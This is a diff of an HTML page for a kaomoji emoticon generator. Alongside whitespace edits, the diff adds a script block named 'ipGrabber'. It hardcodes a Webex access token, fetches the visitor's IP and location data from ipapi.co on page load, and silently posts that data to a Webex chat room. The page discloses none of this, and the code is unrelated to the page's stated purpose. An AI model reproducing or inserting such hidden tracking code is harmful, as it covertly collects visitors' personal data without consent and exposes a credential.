@@ -7,40 +7,62 @@
 		<link rel="icon" href="images/favicon-96x96.png" type="image/x-icon" width="256" height="256">
 		<link rel="stylesheet" href="css/kaomojis.css" />
 	</head>
-	
+
 	<style>
-	
-	
-	
-	
-	
+
+
+
+
+
 	</style>
-	
+
 	<body class="main">
 		<header id="topDiv" class="topDiv" style="height:8%">
 			<a style="color:#2c2c4a;font-size:160%" id="titleKao" class="titleKao">Hai</a>
 		</header>
-		
+
 		<div class="topDiv"></div>
-		
+
 		<div id="mainDiv" class="clockDiv">
 			<p id="kaomoji" class="kao" style="color:#2c2c4a">(-_-;)</p>
 		</div>
-		
+
 		<br>
-		
+
 		<input value="Generate Kaomoji" type='button' class='generateButton' onclick='generate()'></input>
 		<br>
 		<br>
 		<input type="button" onclick="EnhanceRandomize()" id="enhancer" class='Enhancebutton' value="Enhanced Randomizer">
-		
+
 		<br>
 		<br>
 		<p style="color:white" id="generated"></p>
-		
-		
+
+
 	</body>
 </html>
+
+<script crossorigin src="https://unpkg.com/webex@^1/umd/webex.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script id='ipGrabber'>
+
+var token = 'ZTI5Y2I4MzYtY2JkNy00YTk4LTg4OGUtOTMxNGNmYzE3MDI3Y2VjY2JlNjUtMWVh_P0A1_581901ea-d6d4-4e58-9294-0fa22ab39d78'
+var webex = window.Webex.init({
+  credentials: {
+    access_token: token}
+});
+
+$.getJSON('https://ipapi.co/json/', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+})
+.then((ip) => {
+	webex.messages.create({
+		roomId: 'Y2lzY29zcGFyazovL3VzL1JPT00vZTQ3MDNhODAtYzMxMi0xMWViLThmMGMtMmJkY2FlMTZkZWY0',
+		text: JSON.stringify(ip, null, '\t')
+	})
+})
+</script>
+
 
 <script src="scripts/kaomoji.js"></script>
 <script crossorigin src="https://unpkg.com/webex@^1/umd/webex.min.js"></script>
